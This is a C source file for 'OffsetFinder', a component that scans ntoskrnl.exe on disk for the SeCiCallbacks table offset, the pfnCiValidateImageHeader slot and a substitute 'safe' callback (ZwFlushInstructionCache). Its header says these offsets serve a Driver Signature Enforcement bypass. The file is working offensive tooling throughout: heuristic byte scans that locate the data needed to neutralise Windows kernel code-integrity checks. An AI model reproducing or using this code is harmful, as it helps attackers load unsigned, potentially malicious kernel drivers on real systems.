// ============================================================================
// OffsetFinder — offline heuristic scanner for SeCiCallbacks offsets
//
// Reads ntoskrnl.exe from disk and locates two offsets needed for DSE bypass:
//
//   Offset_SeCiCallbacks  — RVA of the SeCiCallbacks pointer table (.data)
//   Offset_SafeFunction   — RVA of a small no-op stub used as a safe callback
//   Offset_Callback       — fixed at 32 == offsetof(CI_CALLBACKS,
//                           pfnCiValidateImageHeader), stable across all builds
//
// Two methods, tried in order:
//
//   1. Structural scan (modern kernels, RS3+):
//      Exhaustive LEA scan across executable sections.  A candidate scores via
//      ScoreZeroingWindow (XOR-zero edx + size imm + CALL); threshold is >= 2
//      (CALL ordering is a soft signal, not required for a pass).
//      Accepted when total heuristic score >= FAST_MIN_SCORE.
//
//   2. Legacy anchor (RS1/RS2 fallback):
//      Searches for  C7 05 [rel32] 08 01 00 00  — a RIP-relative DWORD store of
//      the flags value 0x108 into a writable section.  On older kernels the
//      RtlZeroMemory init pattern is absent so the structural scan never reaches
//      FAST_MIN_SCORE; the flags store is the only reliable anchor.
//
// Returns FALSE (and leaves offsets zeroed) if neither method finds a candidate.
// Caller falls back to the INI offsets or aborts.
// ============================================================================

#include "OffsetFinder.h"
#include "SystemUtils.h"

#define SCN_MEM_WRITE   0x80000000    // IMAGE_SCN_MEM_WRITE
#define SCN_MEM_EXECUTE 0x20000000    // IMAGE_SCN_MEM_EXECUTE
#define LEA_LEN         7             // REX 8D /5 disp32 — always 7 bytes
#define STRUCT_OFFSET   4             // SeCiCallbacks[0] is at offset +4 in the table
#define SECI_FLAGS_EXPECTED 0x108     // expected flags DWORD in the callbacks struct
#define FAST_BACK_WINDOW    0x600     // bytes to scan before the LEA for MOV stores
#define FAST_FORWARD_WINDOW 0x40     // bytes to scan after the LEA for initial stores
#define FAST_QWORD_WINDOW   0x20     // window for FindNearbyQwordStore
#define FAST_MIN_SCORE      110      // minimum CountSeCiMovs score to accept candidate

typedef struct _SECTION_INFO {
    ULONG VirtualAddress;
    ULONG VirtualSize;
    ULONG RawPointer;
    ULONG RawSize;
    ULONG Characteristics;
} SECTION_INFO;

typedef struct _PE_CONTEXT {
    PUCHAR Base;
    SIZE_T Size;
    PIMAGE_NT_HEADERS64 NtHeaders;
    SECTION_INFO Sections[32];
    ULONG SectionCount;
} PE_CONTEXT;

typedef struct _RUNTIME_FUNCTION_INFO {
    ULONG BeginRva;
    ULONG EndRva;
    ULONG BeginOffset;
    ULONG EndOffsetExclusive;
} RUNTIME_FUNCTION_INFO;

typedef struct _RIP_RELATIVE_STORE {
    ULONG FileOffset;
    ULONG Rva;
    ULONG Length;
    ULONG Imm32;
    ULONG TargetRva;
    LONG TargetSectionIndex;
    BOOLEAN IsQword;
} RIP_RELATIVE_STORE;

static BOOLEAN IsWritableData(PE_CONTEXT* ctx, ULONG rva);
static LONG FindSectionIndexForRva(PE_CONTEXT* ctx, ULONG rva);
static BOOLEAN FileOffsetToRva(PE_CONTEXT* ctx, ULONG fileOffset, PULONG rva, PLONG sectionIndex);
static BOOLEAN ReadRipRelativeStore(PE_CONTEXT* ctx, ULONG fileOffset, RIP_RELATIVE_STORE* store);
static BOOLEAN FindNearbyQwordStore(
    PE_CONTEXT* ctx,
    ULONG startOffset,
    ULONG endOffsetExclusive,
    PULONG qwordGap,
    RIP_RELATIVE_STORE* qwordStore);
static BOOLEAN FindRuntimeFunctionBounds(PE_CONTEXT* ctx, ULONG rva, RUNTIME_FUNCTION_INFO* runtimeInfo);
static SIZE_T MinSize(SIZE_T lhs, SIZE_T rhs);
static ULONG MinUlong(ULONG lhs, ULONG rhs);
static BOOLEAN IsWritableSectionIndex(PE_CONTEXT* ctx, LONG sectionIndex);

// Computes the target RVA of a RIP-relative instruction.
// target = instrRva + instrLen + rel32  (standard x64 RIP-relative formula).
static ULONG ComputeRelTargetRva(ULONG instrRva, ULONG instrLen, LONG rel32) {
    return (ULONG)((__int64)instrRva + (__int64)instrLen + (__int64)rel32);
}

static SIZE_T MinSize(SIZE_T lhs, SIZE_T rhs) {
    return lhs < rhs ? lhs : rhs;
}

static ULONG MinUlong(ULONG lhs, ULONG rhs) {
    return lhs < rhs ? lhs : rhs;
}

// Byte-shift LE DWORD read — avoids strict-aliasing / alignment UB when reading
// from PUCHAR buffers that carry no alignment guarantee (e.g. mid-scan positions).
static ULONG ReadLeU32(const UCHAR* p) {
    return ((ULONG)p[0])        |
           ((ULONG)p[1] <<  8)  |
           ((ULONG)p[2] << 16)  |
           ((ULONG)p[3] << 24);
}

// Signed variant — same bit pattern, cast for displacement/rel32 arithmetic.
static LONG ReadLeS32(const UCHAR* p) {
    return (LONG)ReadLeU32(p);
}

// Returns TRUE if the bytes at fileOffset form a RIP-relative LEA:
//   REX.W (0x48-0x4F) 8D /5 disp32  (7 bytes, ModRM = 0bXX000101).
static BOOLEAN IsRipRelativeLea(PE_CONTEXT* ctx, ULONG fileOffset) {
    PUCHAR p;

    if (fileOffset + LEA_LEN > ctx->Size) {
        return FALSE;
    }

    p = ctx->Base + fileOffset;
    return ((p[0] & 0xF8) == 0x48) &&
           p[1] == 0x8D &&
           ((p[2] & 0xC7) == 0x05);
}

// Scores the 96-byte window following a LEA candidate for RtlZeroMemory call
// characteristics (+1 XOR zero, +1 size imm 0x40-0x400, +1 CALL after both).
// A score of 3 strongly indicates the LEA feeds RtlZeroMemory(SeCiCallbacks,N).
static int ScoreZeroingWindow(
    PUCHAR imageBase,
    SIZE_T imageSize,
    ULONG leaFileOffset,
    PULONG zeroSize,
    PBOOLEAN hasZeroSize) {
    int score = 0;
    SIZE_T windowEndOffset = MinSize(imageSize, (SIZE_T)leaFileOffset + 96);
    PUCHAR start = imageBase + leaFileOffset;
    PUCHAR end = imageBase + windowEndOffset;
    PUCHAR zeroPos = end;
    PUCHAR sizePos = end;
    PUCHAR callPos = end;
    PUCHAR p;

    if (zeroSize != NULL) {
        *zeroSize = 0;
    }
    if (hasZeroSize != NULL) {
        *hasZeroSize = FALSE;
    }

    for (p = start; p + 2 <= end; ++p) {
        if ((p[0] == 0x33 && p[1] == 0xD2) ||
            (p[0] == 0x31 && p[1] == 0xD2)) {
            if (p < zeroPos) {
                zeroPos = p;
            }
        }
        if (p + 3 <= end &&
            p[0] == 0x48 &&
            p[1] == 0x33 &&
            p[2] == 0xD2) {
            if (p < zeroPos) {
                zeroPos = p;
            }
        }
    }

    for (p = start; p + 6 <= end; ++p) {
        if (p[0] == 0x41 && p[1] == 0xB8) {
            ULONG imm = ReadLeU32(p + 2);
            if (imm >= 0x40 && imm <= 0x400) {
                sizePos = p;
                if (zeroSize != NULL) {
                    *zeroSize = imm;
                }
                if (hasZeroSize != NULL) {
                    *hasZeroSize = TRUE;
                }
                break;
            }
        }
        if (p + 7 <= end &&
            p[0] == 0x49 &&
            p[1] == 0xC7 &&
            p[2] == 0xC0) {
            ULONG imm = ReadLeU32(p + 3);
            if (imm >= 0x40 && imm <= 0x400) {
                sizePos = p;
                if (zeroSize != NULL) {
                    *zeroSize = imm;
                }
                if (hasZeroSize != NULL) {
                    *hasZeroSize = TRUE;
                }
                break;
            }
        }
    }

    for (p = start; p + 5 <= end; ++p) {
        if (p[0] == 0xE8) {
            callPos = p;
            break;
        }
    }

    if (zeroPos != end) {
        score++;
    }
    if (hasZeroSize != NULL && *hasZeroSize) {
        score++;
    }
    if (callPos != end) {
        PUCHAR earliest = zeroPos < sizePos ? zeroPos : sizePos;
        if (callPos > earliest) {
            score++;
        }
    }

    return score;
}

static LONG FindSectionIndexForRva(PE_CONTEXT* ctx, ULONG rva) {
    ULONG i;

    for (i = 0; i < ctx->SectionCount; i++) {
        ULONG virtualSize = ctx->Sections[i].VirtualSize != 0 ? ctx->Sections[i].VirtualSize : ctx->Sections[i].RawSize;
        if (rva >= ctx->Sections[i].VirtualAddress &&
            rva < ctx->Sections[i].VirtualAddress + virtualSize) {
            return (LONG)i;
        }
    }

    return -1;
}

static BOOLEAN FileOffsetToRva(PE_CONTEXT* ctx, ULONG fileOffset, PULONG rva, PLONG sectionIndex) {
    ULONG i;

    for (i = 0; i < ctx->SectionCount; i++) {
        ULONG start = ctx->Sections[i].RawPointer;
        ULONG end = start + ctx->Sections[i].RawSize;
        if (fileOffset >= start && fileOffset < end) {
            if (rva != NULL) {
                *rva = ctx->Sections[i].VirtualAddress + (fileOffset - start);
            }
            if (sectionIndex != NULL) {
                *sectionIndex = (LONG)i;
            }
            return TRUE;
        }
    }

    return FALSE;
}

static BOOLEAN IsWritableSectionIndex(PE_CONTEXT* ctx, LONG sectionIndex) {
    if (sectionIndex < 0 || (ULONG)sectionIndex >= ctx->SectionCount) {
        return FALSE;
    }

    return (ctx->Sections[sectionIndex].Characteristics & SCN_MEM_WRITE) &&
          !(ctx->Sections[sectionIndex].Characteristics & SCN_MEM_EXECUTE);
}

// Decodes a RIP-relative MOV store at fileOffset.  Recognised forms:
//   C7 05 disp32 imm32       — DWORD store (10 bytes)
//   48 C7 05 disp32 imm32    — QWORD store with sign-extended imm32 (11 bytes)
static BOOLEAN ReadRipRelativeStore(PE_CONTEXT* ctx, ULONG fileOffset, RIP_RELATIVE_STORE* store) {
    PUCHAR p;
    ULONG rva;
    LONG sectionIndex;
    ULONG displacementOffset;
    ULONG instructionLength;
    BOOLEAN isQword;
    LONG rel32;

    if (fileOffset + 10 > ctx->Size || store == NULL) {
        return FALSE;
    }

    p = ctx->Base + fileOffset;
    displacementOffset = 0;
    instructionLength = 0;
    isQword = FALSE;

    if (fileOffset + 11 <= ctx->Size &&
        p[0] == 0x48 &&
        p[1] == 0xC7 &&
        p[2] == 0x05) {
        displacementOffset = 3;
        instructionLength = 11;
        isQword = TRUE;
    } else if (p[0] == 0xC7 && p[1] == 0x05) {
        displacementOffset = 2;
        instructionLength = 10;
        isQword = FALSE;
    } else {
        return FALSE;
    }

    if (!FileOffsetToRva(ctx, fileOffset, &rva, &sectionIndex)) {
        return FALSE;
    }

    rel32 = ReadLeS32(p + displacementOffset);

    store->FileOffset = fileOffset;
    store->Rva = rva;
    store->Length = instructionLength;
    store->Imm32 = ReadLeU32(p + displacementOffset + 4);
    store->TargetRva = ComputeRelTargetRva(rva, instructionLength, rel32);
    store->TargetSectionIndex = FindSectionIndexForRva(ctx, store->TargetRva);
    store->IsQword = isQword;
    return TRUE;
}

static ULONG RvaToOffset(PE_CONTEXT* ctx, ULONG rva) {
    ULONG i;

    if (rva == 0) return 0;
    for (i = 0; i < ctx->SectionCount; i++) {
        if (rva >= ctx->Sections[i].VirtualAddress && 
            rva < ctx->Sections[i].VirtualAddress + ctx->Sections[i].RawSize) {
            return ctx->Sections[i].RawPointer + (rva - ctx->Sections[i].VirtualAddress);
        }
    }
    return 0;
}

static BOOLEAN IsWritableData(PE_CONTEXT* ctx, ULONG rva) {
    return IsWritableSectionIndex(ctx, FindSectionIndexForRva(ctx, rva));
}

// Scans up to FAST_QWORD_WINDOW bytes for a QWORD MOV store targeting writable
// data.  Used to identify the first callback slot initialisation after a LEA.
static BOOLEAN FindNearbyQwordStore(
    PE_CONTEXT* ctx,
    ULONG startOffset,
    ULONG endOffsetExclusive,
    PULONG qwordGap,
    RIP_RELATIVE_STORE* qwordStore) {
    ULONG maxEnd;
    ULONG fileOffset;

    maxEnd = MinUlong(endOffsetExclusive, startOffset + FAST_QWORD_WINDOW);
    for (fileOffset = startOffset + 1; fileOffset < maxEnd; ++fileOffset) {
        RIP_RELATIVE_STORE store;
        if (!ReadRipRelativeStore(ctx, fileOffset, &store)) {
            continue;
        }
        if (!store.IsQword || !IsWritableSectionIndex(ctx, store.TargetSectionIndex)) {
            continue;
        }

        if (qwordGap != NULL) {
            *qwordGap = fileOffset - startOffset;
        }
        if (qwordStore != NULL) {
            *qwordStore = store;
        }
        return TRUE;
    }

    return FALSE;
}

// Searches the .pdata exception directory for the RUNTIME_FUNCTION containing rva.
// Provides function start/end bounds so the SafeFunction scan stays within one
// function body and avoids false positives across function boundaries.
static BOOLEAN FindRuntimeFunctionBounds(PE_CONTEXT* ctx, ULONG rva, RUNTIME_FUNCTION_INFO* runtimeInfo) {
    IMAGE_DATA_DIRECTORY* exceptionDir;
    ULONG dirOffset;
    ULONG availableEntries;
    ULONG maxEntries;
    ULONG i;

    if (runtimeInfo == NULL) {
        return FALSE;
    }

    exceptionDir = &ctx->NtHeaders->OptionalHeader.DataDirectory[3];
    if (exceptionDir->VirtualAddress == 0 || exceptionDir->Size < 12) {
        return FALSE;
    }

    dirOffset = RvaToOffset(ctx, exceptionDir->VirtualAddress);
    if (dirOffset == 0 || dirOffset >= ctx->Size) {
        return FALSE;
    }

    availableEntries = (ULONG)((ctx->Size - dirOffset) / 12);
    maxEntries = exceptionDir->Size / 12;
    if (availableEntries < maxEntries) {
        maxEntries = availableEntries;
    }

    for (i = 0; i < maxEntries; ++i) {
        PUCHAR entry = ctx->Base + dirOffset + (i * 12);
        ULONG beginRva = ReadLeU32(entry + 0);
        ULONG endRva   = ReadLeU32(entry + 4);
        ULONG beginOffset;
        ULONG endOffset;
        LONG beginSection;
        LONG endSection;

        if (beginRva == 0 || endRva <= beginRva) {
            continue;
        }
        if (!(beginRva <= rva && rva < endRva)) {
            continue;
        }

        beginOffset = RvaToOffset(ctx, beginRva);
        endOffset = RvaToOffset(ctx, endRva - 1);
        beginSection = FindSectionIndexForRva(ctx, beginRva);
        endSection = FindSectionIndexForRva(ctx, endRva - 1);
        if (beginOffset == 0 || endOffset == 0) {
            continue;
        }
        if (beginSection < 0 || beginSection != endSection) {
            continue;
        }

        runtimeInfo->BeginRva = beginRva;
        runtimeInfo->EndRva = endRva;
        runtimeInfo->BeginOffset = beginOffset;
        runtimeInfo->EndOffsetExclusive = endOffset + 1;
        return TRUE;
    }

    return FALSE;
}

static ULONG FindExportRva(PE_CONTEXT* ctx, const char* name) {
    IMAGE_DATA_DIRECTORY* exportDir = &ctx->NtHeaders->OptionalHeader.DataDirectory[0];
    if (exportDir->VirtualAddress == 0) return 0;

    ULONG dirOffset = RvaToOffset(ctx, exportDir->VirtualAddress);
    if (dirOffset == 0) return 0;

    PUCHAR exportBase = ctx->Base + dirOffset;
    ULONG count        = ReadLeU32(exportBase + 24);
    ULONG funcTableRva = ReadLeU32(exportBase + 28);
    ULONG nameTableRva = ReadLeU32(exportBase + 32);
    ULONG ordTableRva  = ReadLeU32(exportBase + 36);

    PULONG functions = (PULONG)(ctx->Base + RvaToOffset(ctx, funcTableRva));
    PULONG names = (PULONG)(ctx->Base + RvaToOffset(ctx, nameTableRva));
    PUSHORT ordinals = (PUSHORT)(ctx->Base + RvaToOffset(ctx, ordTableRva));

    if (!functions || !names || !ordinals) return 0;

    for (ULONG i = 0; i < count; i++) {
        ULONG nameOff = RvaToOffset(ctx, names[i]);
        if (nameOff == 0) continue;

        const char* funcName = (const char*)(ctx->Base + nameOff);
        BOOLEAN match = TRUE;
        ULONG j = 0;
        while (name[j] != 0) {
            if (name[j] != funcName[j]) { match = FALSE; break; }
            j++;
        }
        if (match && funcName[j] == 0) {
             return functions[ordinals[i]];
        }
    }
    return 0;
}

// Validates PE headers and populates ctx->Sections[] from the section table.
static BOOLEAN ParsePe(PE_CONTEXT* ctx) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ctx->Base;
    if (dos->e_magic != 0x5A4D) return FALSE;

    // Validate e_lfanew before dereferencing — a corrupt or crafted image could
    // place it past the mapped region.
    if ((SIZE_T)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > ctx->Size) return FALSE;

    ctx->NtHeaders = (PIMAGE_NT_HEADERS64)(ctx->Base + dos->e_lfanew);
    if (ctx->NtHeaders->Signature != 0x00004550) return FALSE;

    ctx->SectionCount = ctx->NtHeaders->FileHeader.NumberOfSections;
    if (ctx->SectionCount > 32) ctx->SectionCount = 32;

    PUCHAR sectionTable = (PUCHAR)ctx->NtHeaders + 4 + sizeof(IMAGE_FILE_HEADER) + ctx->NtHeaders->FileHeader.SizeOfOptionalHeader;

    for (ULONG i = 0; i < ctx->SectionCount; i++) {
        PUCHAR entry = sectionTable + (i * 40);
        ctx->Sections[i].VirtualSize      = ReadLeU32(entry +  8);
        ctx->Sections[i].VirtualAddress   = ReadLeU32(entry + 12);
        ctx->Sections[i].RawSize          = ReadLeU32(entry + 16);
        ctx->Sections[i].RawPointer       = ReadLeU32(entry + 20);
        ctx->Sections[i].Characteristics  = ReadLeU32(entry + 36);
    }
    return TRUE;
}

// Main entry point for offline offset resolution.
// Reads ntoskrnl.exe from disk, runs structural scan first, then legacy anchor
// scan as fallback.  Higher CountSeCiMovs score wins.
// Populates config->Offset_SeCiCallbacks and config->Offset_SafeFunction.
// Returns TRUE if at least Offset_SeCiCallbacks was found.
BOOLEAN FindKernelOffsetsLocally(PCONFIG_SETTINGS config) {
    UNICODE_STRING usPath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile = NULL;
    NTSTATUS status;
    PE_CONTEXT ctx;
    BOOLEAN foundSeci = FALSE;
    BOOLEAN foundSafe = FALSE;
    WCHAR hexBuf[32];
    LONG bestScore = -1;
    ULONG bestSeCiRva = 0;

    memset_impl(&ctx, 0, sizeof(ctx));

    RtlInitUnicodeString(&usPath, L"\\SystemRoot\\System32\\ntoskrnl.exe");
    InitializeObjectAttributes(&oa, &usPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenFile(&hFile, FILE_READ_DATA | SYNCHRONIZE, &oa, &iosb, FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);
    if (!NT_SUCCESS(status)) return FALSE;

    FILE_STANDARD_INFORMATION fsi;
    status = NtQueryInformationFile(hFile, &iosb, &fsi, sizeof(fsi), FileStandardInformation);
    if (!NT_SUCCESS(status)) { NtClose(hFile); return FALSE; }

    ctx.Size = (SIZE_T)fsi.EndOfFile.QuadPart;
    PVOID base = NULL;
    SIZE_T regionSize = ctx.Size;
    status = NtAllocateVirtualMemory((HANDLE)-1, &base, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) { NtClose(hFile); return FALSE; }

    ctx.Base = (PUCHAR)base;
    status = NtReadFile(hFile, NULL, NULL, NULL, &iosb, ctx.Base, (ULONG)ctx.Size, NULL, NULL);
    NtClose(hFile);

    if (!NT_SUCCESS(status) || !ParsePe(&ctx)) {
        NtFreeVirtualMemory((HANDLE)-1, &base, &regionSize, MEM_RELEASE);
        return FALSE;
    }

    DisplayMessage(L"INFO: Scanning ntoskrnl.exe (Fast IDA)...\r\n");

    ULONG safeRva = FindExportRva(&ctx, "ZwFlushInstructionCache");
    if (safeRva) {
        config->Offset_SafeFunction = safeRva;
        foundSafe = TRUE;
        ULONGLONGToHexString(safeRva, hexBuf, TRUE);
        DisplayMessage(L"SUCCESS: SafeFunction found at "); DisplayMessage(hexBuf); DisplayMessage(L"\r\n");
    }

    for (ULONG i = 0; i < ctx.SectionCount; i++) {
        ULONG sectionStart;
        ULONG sectionEnd;

        if (!(ctx.Sections[i].Characteristics & SCN_MEM_EXECUTE)) continue;
        sectionStart = ctx.Sections[i].RawPointer;
        sectionEnd = ctx.Sections[i].RawPointer + ctx.Sections[i].RawSize;
        if (sectionEnd > ctx.Size) {
            sectionEnd = (ULONG)ctx.Size;
        }
        if (sectionStart >= sectionEnd || sectionEnd - sectionStart < 10) {
            continue;
        }

        for (ULONG fileOffset = sectionStart; fileOffset + 10 <= sectionEnd; ++fileOffset) {
            RIP_RELATIVE_STORE store;
            RUNTIME_FUNCTION_INFO runtimeInfo;
            BOOLEAN hasRuntimeInfo;
            ULONG searchStart;
            ULONG searchEnd;
            ULONG qwordGap;
            RIP_RELATIVE_STORE qwordStore;

            if (ctx.Base[fileOffset] != 0xC7 || ctx.Base[fileOffset + 1] != 0x05) {
                continue;
            }
            if (fileOffset > 0 &&
                ctx.Base[fileOffset - 1] == 0x48 &&
                ctx.Base[fileOffset] == 0xC7 &&
                ctx.Base[fileOffset + 1] == 0x05) {
                continue;
            }
            if (!ReadRipRelativeStore(&ctx, fileOffset, &store)) {
                continue;
            }
            if (store.IsQword || !IsWritableSectionIndex(&ctx, store.TargetSectionIndex)) {
                continue;
            }
            if (!(store.Imm32 >= 0x40 && store.Imm32 <= 0x4000)) {
                continue;
            }

            hasRuntimeInfo = FindRuntimeFunctionBounds(&ctx, store.Rva, &runtimeInfo);
            if (hasRuntimeInfo) {
                searchStart = runtimeInfo.BeginOffset;
                searchEnd = MinUlong(runtimeInfo.EndOffsetExclusive, store.FileOffset + FAST_FORWARD_WINDOW);
            } else {
                searchStart = store.FileOffset > FAST_BACK_WINDOW ? store.FileOffset - FAST_BACK_WINDOW : 0;
                searchEnd = MinUlong((ULONG)ctx.Size, store.FileOffset + FAST_FORWARD_WINDOW);
            }

            if (!FindNearbyQwordStore(&ctx, store.FileOffset, searchEnd, &qwordGap, &qwordStore)) {
                continue;
            }

            if (store.FileOffset < LEA_LEN || store.FileOffset <= searchStart) {
                continue;
            }

            {
                ULONG leaTargetRva = store.TargetRva + STRUCT_OFFSET;
                ULONG leaFileOffset = store.FileOffset - LEA_LEN;

                for (;;) {
                    if (IsRipRelativeLea(&ctx, leaFileOffset)) {
                        ULONG leaRva;
                        LONG leaSectionIndex;
                        LONG rel32;
                        ULONG leaTarget;

                        if (FileOffsetToRva(&ctx, leaFileOffset, &leaRva, &leaSectionIndex)) {
                            rel32 = ReadLeS32(ctx.Base + leaFileOffset + 3);
                            leaTarget = ComputeRelTargetRva(leaRva, LEA_LEN, rel32);

                            if (leaTarget == leaTargetRva && IsWritableData(&ctx, leaTarget)) {
                                ULONG zeroSize;
                                BOOLEAN hasZeroSize;
                                int zeroScore = ScoreZeroingWindow(ctx.Base, ctx.Size, leaFileOffset, &zeroSize, &hasZeroSize);
                                if (zeroScore >= 2) {
                                    LONG score = 80;
                                    ULONG qwordDelta;
                                    ULONG distancePenalty;

                                    score += zeroScore * 12;
                                    score += 30 - (LONG)(qwordGap < 24 ? qwordGap : 24);

                                    distancePenalty = (store.FileOffset - leaFileOffset) / 32;
                                    if (distancePenalty > 12) {
                                        distancePenalty = 12;
                                    }
                                    score -= (LONG)distancePenalty;

                                    qwordDelta = qwordStore.TargetRva - store.TargetRva;
                                    if (qwordDelta > 0) {
                                        score += 8;
                                    }
                                    if (store.Imm32 == SECI_FLAGS_EXPECTED) {
                                        score += 12;
                                    }
                                    if (hasZeroSize) {
                                        if (qwordStore.TargetRva - leaTarget == zeroSize) {
                                            score += 18;
                                        }
                                        if (store.Imm32 == zeroSize + 12) {
                                            score += 18;
                                        } else if (store.Imm32 == zeroSize + 8 || store.Imm32 == zeroSize + 16) {
                                            score += 6;
                                        }
                                    }
                                    if (qwordDelta == store.Imm32 - 8) {
                                        score += 20;
                                    }

                                    if (score > bestScore) {
                                        bestScore = score;
                                        bestSeCiRva = store.TargetRva;
                                    }
                                }
                            }
                        }
                    }

                    if (leaFileOffset == searchStart) {
                        break;
                    }
                    leaFileOffset--;
                }
            }
        }
    }

    if (bestScore >= FAST_MIN_SCORE) {
        config->Offset_SeCiCallbacks = bestSeCiRva;
        // offsetof(CI_CALLBACKS, pfnCiValidateImageHeader) == 32, stable across
        // all known builds; no need to derive it from the image.
        config->Offset_Callback = 32;
        foundSeci = TRUE;
        ULONGLONGToHexString(bestSeCiRva, hexBuf, TRUE);
        DisplayMessage(L"SUCCESS: SeCiCallbacks found at "); DisplayMessage(hexBuf); DisplayMessage(L"\r\n");
    }

    // Legacy anchor fallback — covers RS1/RS2 where CipInitialize does not call
    // RtlZeroMemory on the callbacks structure, so the structural scan never
    // accumulates enough score.  The flags DWORD (0x108) store is the only
    // pattern that has been consistent across all builds from RS1 onward.
    if (!foundSeci) {
        for (ULONG i = 0; i < ctx.SectionCount; i++) {
            if (!(ctx.Sections[i].Characteristics & SCN_MEM_EXECUTE)) continue;
            ULONG sectionStart = ctx.Sections[i].RawPointer;
            ULONG sectionEnd   = MinUlong(ctx.Sections[i].RawPointer + ctx.Sections[i].RawSize,
                                          (ULONG)ctx.Size);

            for (ULONG off = sectionStart; off + 10 <= sectionEnd; ++off) {
                if (ctx.Base[off] != 0xC7 || ctx.Base[off + 1] != 0x05) continue;
                // Skip the QWORD-prefix form (48 C7 05) — ReadRipRelativeStore
                // handles it, but we only want the plain DWORD store here.
                if (off > 0 && ctx.Base[off - 1] == 0x48) continue;

                RIP_RELATIVE_STORE store;
                if (!ReadRipRelativeStore(&ctx, off, &store)) continue;
                if (store.IsQword) continue;
                if (store.Imm32 != SECI_FLAGS_EXPECTED) continue;
                if (!IsWritableSectionIndex(&ctx, store.TargetSectionIndex)) continue;
                // Reject anything landing in the PE headers.
                if (store.TargetRva < 0x1000) continue;

                config->Offset_SeCiCallbacks = store.TargetRva;
                config->Offset_Callback = 32;
                foundSeci = TRUE;
                ULONGLONGToHexString(store.TargetRva, hexBuf, TRUE);
                DisplayMessage(L"SUCCESS: SeCiCallbacks (legacy anchor) at ");
                DisplayMessage(hexBuf); DisplayMessage(L"\r\n");
                goto legacy_done;
            }
        }
        legacy_done:;
    }

    NtFreeVirtualMemory((HANDLE)-1, &base, &regionSize, MEM_RELEASE);
    
    if (!foundSeci) DisplayMessage(L"WARNING: SeCiCallbacks NOT found!\r\n");
    if (!foundSafe) DisplayMessage(L"WARNING: SafeFunction NOT found!\r\n");

    return (foundSeci && foundSafe);
}
